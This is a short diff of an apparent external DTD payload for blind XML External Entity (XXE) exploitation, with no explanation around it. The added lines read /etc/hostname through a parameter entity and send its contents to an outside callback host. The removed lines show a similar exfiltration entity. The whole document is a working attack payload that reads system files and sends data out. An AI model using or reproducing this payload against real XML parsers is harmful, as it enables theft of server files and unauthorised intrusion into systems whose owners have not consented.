@@ -1,2 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://rqlccflitg9vhl0g0qeb3s2tnktdh45t.x9.to/?%file;'>"> %all;
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://jcz4y77af8vn3dm8mi03pkol9cf73xrm.x9.to/?x=%file;'>">
+%eval;
+%exfil
